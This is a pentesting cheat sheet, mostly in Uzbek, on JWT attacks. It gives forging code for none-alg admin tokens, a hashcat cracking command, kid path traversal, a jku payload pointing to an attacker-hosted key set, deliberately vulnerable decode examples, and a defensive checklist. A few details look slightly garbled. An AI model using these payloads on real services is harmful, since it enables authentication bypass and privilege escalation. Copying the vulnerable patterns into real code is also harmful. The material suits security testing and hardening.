# JWT Attacks

## 1. Ta'rif
JWT — JSON Web Token (header.payload.signature). Zaifliklar: algorithm confusion, none alg, weak secret, claims abuse, signature not verified, key confusion (RS256→HS256), token in URL/log, long-lived.

## 2. Qayerdan kelib chiqadi
- Server signature'ni tekshirmasang (parse only)
- Alg olib yuruvchi: `alg`, `kid`, `jku`, `x5u` — attacker nazoratida
- `none` alg ruxsat
- Weak HMAC secret (`secret`, `password`, rockyou)
- RS256 (public key) — attacker HS256 emanat (server public key secret qilib)
- `kid` — file read/LFI ichida
- `jku`/`x5u` — external key (attacker controlled)
- `sub`/`role`/`admin` claims — client manipulable bo'lsa

## 3. Turlari
| Tur | Misol |
|-----|-------|
| none algorithm | `{"alg":"none"}` |
| Weak HMAC secret | crack `secret` |
| Alg confusion | RS256 → HS256 (public key) |
| kid injection | `kid: "../../etc/passwd"` (file read) |
| jku/x5u | remote JWKS |
| Claims abuse | change sub/role |
| Not verified | signature omitted/ignored |

## 4. Metodologiya
1. JWT'ni token'dan (Authorization: Bearer / cookie) oling — `jwt.io` decode.
   - **header**: alg, typ, kid
   - **payload**: sub, exp, role, iat, jti
2. `alg: none` — signature'ni bo'sh qiling:
   ```
   header: {"alg":"none","typ":"JWT"}  (base64url)
   payload: {"sub":"admin","role":"admin"}
   token: e30.e30.           (davom . o'qq!)
   ```
   Variantlari: `"NONE"`, `"None"`, `"nOnE"`, `"none"`.
3. Weak secret — hashcat/John:
   ```
   hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
   # key topilsa — o'z token'ingizni yasang
   ```
4. Algorithm confusion (RS256):
   - server RS256 (pub key) da ishlaydi
   - attacker HS256 bilan public key bazasida HMAC sign:
   - public key (e.g. /jwks) base64 component → novella header HS256
   ```
   python jwt_attack_rsa.py ...
   # payl: header {"alg":"HS256"}, signature = HMAC-SHA256(pubkey_content, payload)
   ```
5. `kid`: file read — `{"kid": "/etc/passwd"}`; arbitrary key if server loads kid value.
6. `jku`/`x5u`:  JWKS URL attacker'ga — server uni fetch (SSRF). Payload: `{"jku":"https://attacker/jwks.json"}`.
7. Claims: `sub`, `role`, `email_verified`, `iat` (future), `exp` (muqaddam) — change qilish.
8. Signature check'lari:
   - Token'ni bir xil qoldirib signature'ni o'zgartiring → 401
   - Signature olib tashlang (3-qism bo'lmasa) → 200?
   - Double alg duplicate header: `{"alg":"HS256","alg":"none"}`
9. Clock: exp/iat — future validation muammo (algol).

## 5. Payload'lar (tamper)
```python
import base64, json, hmac, hashlib

def b64(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

# none alg
tok = b64(b'{"alg":"none","typ":"JWT"}') + "." + b64(b'{"sub":"1","role":"admin"}') + "."

# HS256 brute (hashcat -m 16500)
# key = 'secret123'
h = hmac.new(b'secret123', (head+"."+pay).encode(), hashlib.sha256)
tok = head+"."+pay+"."+b64(h.digest())
```
## 6. Request misollari
```
GET /api/admin HTTP/1.1
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.

# alg: none signature bo'sh (nuqta bilan)
```
## 7. Zaif code misollari
```python
# ZAIF — verification yo'q
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
# yoki
payload = jwt.decode(token, key, algorithms=["HS256"])   # RS256 token HS256'da dekod — confusion

# ZAIF — weak secret
jwt.encode({"user": "u"}, "secret", algorithm="HS256")
```
## 8. Nimalarga ahamiyat berish (checklist)
- [ ] `alg` open list — never client selectable
- [ ] Secret — uzun/random, yoki asymmetric (RS/ES)
- [ ] `kid/jku/x5u` — validation, whitelist URL
- [ ] Signature always verify
- [ ] `reject("none")` — hamma case variant
- [ ] exp/iat/nbf — check; claims `role`, `admin`, `sub`
- [ ] Token in URL/logs/JS (exfil)
- [ ] RS256→HS256 confusion test (public key as secret)
- [ ] Same token reuse after password change
## 9. Himoya
- Library standard: verify signature + alg allowlist (RS256/etc), `require_exp`
- Never trust client alg; `kid/jku` exact match
- Strong random secret / private key PEM, rotate keys
- Check claims: sub bound to resource, role re-read from DB